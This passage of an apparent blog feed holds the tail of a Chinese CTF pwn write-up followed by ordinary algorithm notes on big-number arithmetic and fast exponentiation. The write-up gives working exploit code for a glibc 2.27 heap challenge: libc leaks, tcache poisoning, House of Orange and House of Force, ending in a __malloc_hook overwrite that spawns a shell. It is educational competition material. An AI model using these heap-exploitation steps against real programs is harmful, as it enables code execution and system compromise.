class="string">b&#x27;Chunk at index 2: &#x27;</span>)</span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x3ebca0</span>-<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>这道题虽然不用，但是还有一个重要的点是，这里**一块就能泄露libc和堆地址了。**比赛的时候试着打堆地址有0截断出不来，但是其实有个关键细节想错了，就是这个用orange拿到的堆块并不更新lastremainder，它没有被切过，此时lastremainder是0，也就是说分配0x1000这个largechunk之前会跑一次循环，把这个堆块放进largebin！也就是说这个块里面会同时有我们的堆和libc地址，申请出来的可控chunk也是都有的，只需要泄露libc后将fd和bk填充上再泄露就不会0截断了，把fdnextsize打出来就有heap地址了。</p><h2 id="第二步呢？">第二步呢？</h2><p>orange只能给我们一个free堆块，常规手段应该就到这了，比赛就卡在这里。按学长和WM的wp走的话这里有两种思路：</p><ol><li class="lvl-3"><p>复读！</p></li><li class="lvl-3"><p>House of Force</p></li></ol><p>先来说第一种，这道题是任意溢出，完全不检查，因此我们申请出的第二个0xe10的chunk应该是新的top切下来的，那我们从这溢出新的top再free不就有新的堆块了？而且这个堆块的size我们可以任意控制，由于没有free我们不好构造fakechunk进行操作，最好的办法肯定是劫持到tcache，因此把size改到最小的对齐然后拿到tcache，2.27的tcache基本是四处漏风：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,<span class="number">0xe10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe08</span>+p64(<span class="number">0x1f1</span>))</span><br><span class="line">add(<span class="number">0xe00</span>) <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># hijack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0xe18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe08</span>+p64(<span class="number">0x1d1</span>)+p64(malloc_hook))</span><br><span class="line"><span class="comment"># --------</span></span><br><span class="line">add(<span class="number">0x1c8</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x1c8</span>) <span class="comment"># 5 &lt;- arbitrary alloc</span></span><br></pre></td></tr></table></figure><p>然后第二种，目前不清楚有没有什么限制，没有的话看wp的步骤也是一种很好用的方法，是利用整数溢出的houseofforce把top抬高到我们想要的位置。当然这道题要想任意地址分配的话还是得走tcache，这里拿到tcache perthread struct的控制权然后随便找个合适的size写入也能达到任意地址分配的目的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xB60</span>)<span class="comment"># 3 取走bin里的chunk</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment"># 4 新top切割的</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x110</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x108</span> + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)) <span class="comment"># House of Force</span></span><br><span class="line">add(-<span class="number">0x22130</span>)<span class="comment"># 5 整数溢出把top推到堆起始地址</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span> + p64(libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>])</span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment"># 6这个堆块在开头，用来劫持tcache perthread struct</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x110</span>, payload) <span class="comment"># 在tcache[size=0x190]的位置写入了__malloc_hook</span></span><br><span class="line">add(<span class="number">0x190</span>)<span class="comment"># 7 申请出来 </span></span><br></pre></td></tr></table></figure><h1>下一步…</h1><p>最幽默的一集来了，回收伏笔：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __cdecl <span class="title function_">checksanbox</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;                                      <span class="comment">/*here ↓*/</span></span><br><span class="line">  <span class="keyword">if</span> ( ptr &gt;= (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x368270</span> &amp;&amp; ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x36B270</span> ) <span class="comment">//注意这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> ptr &gt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x5995B2</span> || ptr &lt; (<span class="type">char</span> *)&amp;<span class="built_in">puts</span> + <span class="number">0x599596</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这个malloc，他妈的他这边在mallochook这没有等号！也就是说只要返回的指针恰好是mallochook就没问题了。。。tcache里面直接写mallochook然后返回写入onegadget直接getshell</p><p>这里比赛当天还尝试在mainarena附近用house of lore打chunklist，看来想多了，确实是ezheap。这下知道house of orange的妙用了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题目比赛的时候思路卡住了，有两个其实很简单的点都没想到，不然初赛战队就能第三名拿钱了。&lt;/p&gt;
&lt;h1&gt;题目分析&lt;/h1&gt;
&lt;p&gt;GLIBC2.27，符号表都没去，就是add，edit，show，delete，exit。malloc返回的指针存在数组里。漏洞明显的不能再</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="heap" scheme="https://zjw1nd.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm(1)</title>
    <link href="https://zjw1nd.github.io/2024/09/24/Algorithm-1/"/>
    <id>https://zjw1nd.github.io/2024/09/24/Algorithm-1/</id>
    <published>2024-09-24T04:35:46.000Z</published>
    <updated>2024-11-28T15:34:50.752Z</updated>
    
    <content type="html"><![CDATA[<h1>写在前面（关于做题的经验）</h1><ul class="lvl-0"><li class="lvl-2">判断是不是用简单的算法思想就能解决（不需要更多数据结构），分治？贪心？</li><li class="lvl-2">如果是贪心，核心是确定好cmp函数</li><li class="lvl-2">如果是分治，确定递归函数的内容，全局数组+左边界（参数1）+右边界（参数2）+参数3</li><li class="lvl-2">剪枝：搜索过程中利用某些额外的条件判断提前返回从而优化搜索时间</li><li class="lvl-2">反向思考，a要能到b，b到a？</li><li class="lvl-2">常见数据结构和算法的模板</li></ul><h1>高精度计算</h1><p>本质上是字符串处理。参考oi wiki的高精乘和加模板</p><blockquote><p>高精加：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b[], <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="comment">// 高精度实现中，一般令数组的最大长度 LEN 比可能的输入大一些</span></span><br><span class="line">  <span class="comment">// 然后略去末尾的几次循环，这样一来可以省去不少边界情况的处理</span></span><br><span class="line">  <span class="comment">// 因为实际输入不会超过 1000 位，故在此循环到 LEN - 1 = 1003 已经足够</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 将相应位上的数码相加</span></span><br><span class="line">    c[i] += a[i] + b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 进位</span></span><br><span class="line">      c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">      c[i] -= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精*低精：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mul_short</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b, <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 直接把 a 的第 i 位数码乘以乘数，加入结果</span></span><br><span class="line">    c[i] += a[i] * b;</span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      <span class="comment">// 处理进位</span></span><br><span class="line">      <span class="comment">// c[i] / 10 即除法的商数成为进位的增量值</span></span><br><span class="line">      c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">      <span class="comment">// 而 c[i] % 10 即除法的余数成为在当前位留下的值</span></span><br><span class="line">      c[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进位单独抽出来也行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">result_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(sav,<span class="number">0</span>,<span class="built_in">sizeof</span>(sav));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">500</span>;i+=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">500</span>;j+=<span class="number">1</span>)</span><br><span class="line">            sav[i+j<span class="number">-1</span>]+=res[i]*f[j];<span class="comment">//先计算每一位上的值（不进位）</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">register</span> <span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">500</span>;i+=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sav[i+<span class="number">1</span>]+=sav[i]/<span class="number">10</span>;<span class="comment">//单独处理进位问题，不容易出错</span></span><br><span class="line">        sav[i]%=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(res,sav,<span class="built_in">sizeof</span>(res));<span class="comment">//cstring库里的赋值函数，把sav的值赋给res</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精*高精：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mul</span><span class="params">(<span class="type">int</span> a[], <span class="type">int</span> b[], <span class="type">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 这里直接计算结果中的从低到高第 i 位，且一并处理了进位</span></span><br><span class="line">    <span class="comment">// 第 i 次循环为 c[i] 加上了所有满足 p + q = i 的 a[p] 与 b[q] 的乘积之和</span></span><br><span class="line">    <span class="comment">// 这样做的效果和直接进行上图的运算最后求和是一样的，只是更加简短的一种实现方式</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">      c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">      c[i] %= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高精度输入输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">clear</span>(a);</span><br><span class="line">  <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="comment">// 如上所述，反转</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  <span class="comment">// s[i] - &#x27;0&#x27; 就是 s[i] 所表示的数码</span></span><br><span class="line">  <span class="comment">// 有些同学可能更习惯用 ord(s[i]) - ord(&#x27;0&#x27;) 的方式理解</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> a[])</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">    <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>快速模幂的代码实现</h1><p>原理课上学过，拆成2进制后复用自乘减少次数，优化复杂度到$Ologn$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">quickPower</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span><span class="comment">//是求a的b次方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans = <span class="number">1</span>, base = a;<span class="comment">//ans为答案，base为a^(2^n)</span></span><br><span class="line"><span class="keyword">while</span>(b &gt; <span class="number">0</span>)<span class="comment">//b是一个变化的二进制数，如果还没有用完</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span>(b &amp; <span class="number">1</span>)<span class="comment">//&amp;是位运算，b&amp;1表示b在二进制下最后一位是不是1，如果是：</span></span><br><span class="line">ans *= base;<span class="comment">//把ans乘上对应的a^(2^n)</span></span><br><span class="line"></span><br><span class="line">        base *= base;<span class="comment">//base自乘，模乘这里要取模</span></span><br><span class="line">b &gt;&gt;= <span class="number">1</span>;<span class="comment">// 模乘这里要取模</span></span><br><span class="line">        <span class="comment">//位运算，b右移一位，如101变成10（把最右边的1移掉了），10010变成1001。现在b在二进制下最后一位是刚刚的倒数第二位。结合上面b &amp; 1食用更佳</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 模乘这里要处理b为0情况</span></span><br><span class="line">    <span class="comment">// ans%=p</span></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模乘的话，就在每一个乘法后面都添加一个模，<strong>注意边界情况</strong>。</p><h1>素性检测</h1><p>$n^2$遍历</p><h1>最大流</h1><p><strong>最大流最小割定理</strong>：最大流的值等于最小割的容量。（强对偶）</p><p>Ford-Fulkerson $O(mnC)$</p><h1>KMP算法</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;写在前面（关于做题的经验）&lt;/h1&gt;
&lt;ul class=&quot;lvl-0&quot;&gt;
&lt;li class=&quot;lvl-2&quot;&gt;判断是不是用简单的算法思想就能解决（不需要更多数据结构），分治？贪心？&lt;/li&gt;
&lt;li class=&quot;lvl-2&quot;&gt;如果是贪心，核心是确定好cmp函数&lt;/li</summary>
      
    
    
    
    
    <category term="算法" scheme="https://zjw1nd.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
